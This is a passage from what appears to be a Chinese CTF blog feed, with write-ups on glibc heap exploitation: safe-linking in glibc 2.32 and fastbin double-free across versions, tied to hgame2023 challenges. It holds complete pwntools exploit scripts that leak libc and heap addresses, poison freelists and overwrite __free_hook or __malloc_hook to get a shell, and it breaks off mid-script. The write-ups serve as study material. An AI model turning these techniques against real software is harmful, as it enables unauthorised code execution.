class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>tcache_max_bin=libcbase+<span class="hljs-number">0x1e3280</span>+<span class="hljs-number">80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_max_bin))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">0</span>)<br>pad1=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pad1))<br>edit(<span class="hljs-number">0</span>,p64(pad1)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(tcache_max_bin-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">5</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=(u64(s)&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x1000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x610</span>)<br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">6</span>,p64(pack(heap+<span class="hljs-number">0x2930</span>,free_hook)))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x610</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x610</span>)<br>edit(<span class="hljs-number">9</span>,p64(system_addr))<br>delete(<span class="hljs-number">8</span>)<br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>safe-linking</title>
    <link href="/2023/01/25/safe-linking/"/>
    <url>/2023/01/25/safe-linking/</url>
    
    <content type="html"><![CDATA[<p>hgame碰到的，之前写源码分析的时候就注意到了但没细看，结果立马就碰见了（挺玄学）。那就来仔细分析下这个东西(ง •_•)ง</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>2.32增加了单链表的保护机制，对fastbin和tcache的fd指针进行了运算，相关源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>变化就是fd成员的内容从下一个chunk的地址ptr变成ptr^(&amp;ptr&gt;&gt;12)（亦或移位操作后的所存地址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br><span class="hljs-comment">//e-&gt;next = tcache-&gt;entries[tc_idx];（2.31源码）</span><br><br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>在有uaf的情况下我们可以泄露出e-&gt;next，但最初tcache链表是空的，及tcache-&gt;entries[tc_idx] &#x3D; 0，设e为放入tcache的tcache_entry，那e-&gt;next &#x3D; (&amp;e-&gt;next&gt;&gt;12)^0 &#x3D; &amp;e-&gt;next&gt;&gt;12<br>已知chunk地址和heap基址的偏移我们可以通过泄露出来的值确定heap的基址，这意味着&amp;e-&gt;next的值之后都是已知的</p><h1 id="例题hgame2023-week3-safe-note"><a href="#例题hgame2023-week3-safe-note" class="headerlink" title="例题hgame2023 week3 safe-note"></a>例题hgame2023 week3 safe-note</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>还是uaf（一个uaf出了两星期也是醉了，我看这个文件都快看吐了）  </p><ul><li><p>先按上文所说泄露heap基址（fd&lt;&lt;12就是heap基址）</p><img src="/2023/01/25/safe-linking/heapbase.png" class title="heap基址"></li><li><p>然后老套路unsorted bin泄露libc基址    </p></li><li><p>再申请然后释放两个另外大小的chunk（tcache有chunk数量的检测），更改chunk1的fd为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(&amp;chunk1-&gt;fd&gt;&gt;<span class="hljs-number">12</span>)^&amp;__free_hook<br></code></pre></td></tr></table></figure><img src="/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%89%8D.png" class title="更改前"><img src="/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%90%8E.png" class title="更改后"></li><li><p>然后就是老套路了</p></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br>p=process(<span class="hljs-string">&#x27;./safe&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;week-3.hgame.lwsec.cn&#x27;,32629)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>s=(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=u64(s)&lt;&lt;<span class="hljs-number">12</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">11</span>):<br>    add(i,<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">9</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>s=(<span class="hljs-string">b&#x27;\n&#x27;</span>+p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0xc0a</span>+<span class="hljs-number">0xb90</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x20</span>)<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">11</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>edit(<span class="hljs-number">11</span>, p64(pack(heap + <span class="hljs-number">0x290</span>+<span class="hljs-number">0x9b0</span>+<span class="hljs-number">0x10</span>, free_hook)))<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">14</span>,p64(system_addr))<br>delete(<span class="hljs-number">13</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastbin dup</title>
    <link href="/2023/01/23/fastbin-dup/"/>
    <url>/2023/01/23/fastbin-dup/</url>
    
    <content type="html"><![CDATA[<p>锵锵！how2heap系列第一篇！正式开始堆漏洞系列的学习！系列模式预计是原理+例题，还有各版本的利用差异。冲！(｡･∀･)ﾉﾞ</p><span id="more"></span><h1 id="相关检查（所用源码版本2-23）"><a href="#相关检查（所用源码版本2-23）" class="headerlink" title="相关检查（所用源码版本2.23）"></a>相关检查（所用源码版本2.23）</h1><p>malloc中对从fastbin中取chunk的检查只有size的合法性检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">         <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>           &#123;<br><span class="hljs-comment">//chunksize和相应fastbin链的大小相符检测</span><br>             errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>           errout:<br>             malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>           &#125;<br></code></pre></td></tr></table></figure><p>free中对于将chunk放进fastbin的检查有：</p><ul><li>开始对所有chunk的对齐和大小是否超界的检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//筛掉一些特别大的chunk（超出内存边界）</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//对齐检查</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li>下一个chunk是不是top chunk<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">     */</span><br>     &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><br>     )<br></code></pre></td></tr></table></figure></li><li>下一个chunk的大小是否超界的检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li>fastbin的第一个chunk是不是插入的chunk（double free检查）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li>以及chunk的大小合法性检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h2><p>为了避开free中double free的检查（只检查第一个chunk是不是正在free的chunk），一般在double free中间再free另一个chunk形成a-&gt;b-&gt;a的形式再通过申请回第一个a来改变最后一个a的fd指针指向fake chunk<br>一般会将fd指针指向__malloc_hook-0x23，这个地址+8有一个0x7f，可以作为合法的size。这样我们可以在申请chunk的时候申请0x60大小的chunk来绕开chunk的size的合法性检查，将malloc_hook改为one_gadget的地址（free_hook前面全是0）</p><img src="/2023/01/23/fastbin-dup/fake_chunk.png" class title="fake chunk"><h2 id="2-27-2-31"><a href="#2-27-2-31" class="headerlink" title="2.27-2.31"></a>2.27-2.31</h2><p>2.26比之前最大的变化就是在fastbin之前增加了tcache，利用方法也发（bian）生（jian）了（dan）变（le）化（ne）    </p><ul><li>先申请7个chunk填满tcache</li><li>再在fastbin中形成a-&gt;b-&gt;a</li><li>再把tcache清空</li><li>再申请一个chunk就可以申请到a，同时b和a（2）就会被放进tcache，这时tcache是这样的b-&gt;a（fastbin的chunk放进tcache是每次取最后一个chunk再执行tcache_put）</li><li>由于tcache中没有size的检查，所以直接改free_hook就行（注意tcache中的指针指向的是chunk中的data）</li></ul><h2 id="2-32以上"><a href="#2-32以上" class="headerlink" title="2.32以上"></a>2.32以上</h2><p>增加了单链表的指针保护机制以及地址0x10对齐检查（错位找0x7f打fastbin不行了）</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hgame2023-week2-fast-note"><a href="#hgame2023-week2-fast-note" class="headerlink" title="hgame2023 week2 fast_note"></a>hgame2023 week2 fast_note</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>libc版本2.23<br>金典的菜单题，有UAF。思路就是先填满tcache利用unsorted bin泄露libc基址，再用fastbin double free将malloc_hook改为one_gadget<br>这道题麻烦的地方在于四个one_gadget都不可用 </p><img src="/2023/01/23/fastbin-dup/one_gadget.png" class title="one_gadget"><p>其中后三个one_gadget限定的是栈空间，那我们就可以通过realloc调节栈内容</p><h3 id="realloc调节栈内容"><a href="#realloc调节栈内容" class="headerlink" title="realloc调节栈内容"></a>realloc调节栈内容</h3><p>realloc的执行流程和malloc一样也是先检查hook是否为null，如果不为null就调用hook<br>realloc函数开头有很多push指令，可以通过push指令抬高栈，push指令的数量可以通过偏移调整</p><img src="/2023/01/23/fastbin-dup/realloc.png" class title="realloc（libc-2.23.so）"><p>我们可以将malloc_hook填充为realloc+offset（offset可取0，2，4，6，12，13），offset越大，push指令越少，栈地址越高；再将realloc_hook填充为one_gadget。而realloc_hook的地址其实就在malloc_hook上方</p><img src="/2023/01/23/fastbin-dup/realloc_hook.png" class title="realloc_hook"><p>在改fd指针时可以一趟改掉</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-comment">#p=process(&#x27;./fast&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p=remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">31626</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;)</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>malloc_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>one_addr=libcbase+<span class="hljs-number">0xf1247</span><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">0x8</span>)+p64(one_addr)+p64(realloc_addr+<span class="hljs-number">6</span>))<br><span class="hljs-comment">#add(8,0x10,b&#x27;a&#x27;)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">8</span>).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">16</span>).encode())<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><h2 id="hgame2023-week2-new-fast-note"><a href="#hgame2023-week2-new-fast-note" class="headerlink" title="hgame2023 week2 new_fast_note"></a>hgame2023 week2 new_fast_note</h2><p>libc版本2.31</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>没啥难度，就是tcache版本的fastbin double free，不说了。就是注意这道题没有重复malloc的检查了（做的时候没看见QAQ）</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 